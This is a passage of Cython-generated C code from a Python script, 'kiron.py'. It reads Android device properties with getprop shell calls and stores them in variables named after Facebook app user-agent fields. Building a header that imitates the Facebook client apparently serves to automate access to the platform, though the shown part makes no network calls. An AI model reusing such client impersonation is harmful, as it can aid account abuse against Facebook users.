 * else:
 *     a = ltx             # <<<<<<<<<<<<<<
 *     tag = "AM"
 * #__________________| ETC |__________________#
 */
  /*else*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ltx); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 70, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_t_7) < 0) __PYX_ERR(0, 70, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "kiron.py":71
 * else:
 *     a = ltx
 *     tag = "AM"             # <<<<<<<<<<<<<<
 * #__________________| ETC |__________________#
 * sim_id = ''
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_tag, __pyx_n_s_AM) < 0) __PYX_ERR(0, 71, __pyx_L1_error)
  }
  __pyx_L37:;

  /* "kiron.py":73
 *     tag = "AM"
 * #__________________| ETC |__________________#
 * sim_id = ''             # <<<<<<<<<<<<<<
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sim_id, __pyx_kp_s__63) < 0) __PYX_ERR(0, 73, __pyx_L1_error)

  /* "kiron.py":74
 * #__________________| ETC |__________________#
 * sim_id = ''
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_check_output); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 74, __pyx_L1_error)
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__113, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_decode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_replace); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_android_version, __pyx_t_2) < 0) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":75
 * sim_id = ''
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_check_output); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 75, __pyx_L1_error)
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__116, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_model, __pyx_t_3) < 0) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":76
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fblc = 'en_GB'
 * try:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 76, __pyx_L1_error)
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__117, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_build, __pyx_t_7) < 0) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":77
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'             # <<<<<<<<<<<<<<
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fblc, __pyx_n_s_en_GB) < 0) __PYX_ERR(0, 77, __pyx_L1_error)

  /* "kiron.py":78
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 * except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "kiron.py":79
 * fblc = 'en_GB'
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')             # <<<<<<<<<<<<<<
 * except:
 *         fbcr = 'Zong'
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_check_output); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 79, __pyx_L38_error)
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__118, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_decode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__120, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_t_7) < 0) __PYX_ERR(0, 79, __pyx_L38_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "kiron.py":78
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 * except:
 */
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L43_try_end;
    __pyx_L38_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "kiron.py":80
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 * except:             # <<<<<<<<<<<<<<
 *         fbcr = 'Zong'
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 */
    /*except:*/ {
      __Pyx_AddTraceback("kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 80, __pyx_L40_except_error)
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);

      /* "kiron.py":81
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 * except:
 *         fbcr = 'Zong'             # <<<<<<<<<<<<<<
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 */
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbcr, __pyx_n_s_Zong) < 0) __PYX_ERR(0, 81, __pyx_L40_except_error)
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L39_exception_handled;
    }

    /* "kiron.py":78
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'
 * try:             # <<<<<<<<<<<<<<
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 * except:
 */
    __pyx_L40_except_error:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L39_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_1);
    __pyx_L43_try_end:;
  }

  /* "kiron.py":82
 * except:
 *         fbcr = 'Zong'
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 * fbdv = model
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_check_output); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 82, __pyx_L1_error)
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__121, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbmf, __pyx_t_7) < 0) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "kiron.py":83
 *         fbcr = 'Zong'
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fbdv = model
 * fbsv = android_version
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_check_output); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 83, __pyx_L1_error)
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__122, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_decode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_replace); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__115, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbbd, __pyx_t_2) < 0) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":84
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 * fbdv = model             # <<<<<<<<<<<<<<
 * fbsv = android_version
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_model); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbdv, __pyx_t_2) < 0) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":85
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 * fbdv = model
 * fbsv = android_version             # <<<<<<<<<<<<<<
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_android_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 85, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbsv, __pyx_t_2) < 0) __PYX_ERR(0, 85, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":86
 * fbdv = model
 * fbsv = android_version
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')             # <<<<<<<<<<<<<<
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_check_output); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 86, __pyx_L1_error)
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__123, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__125, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
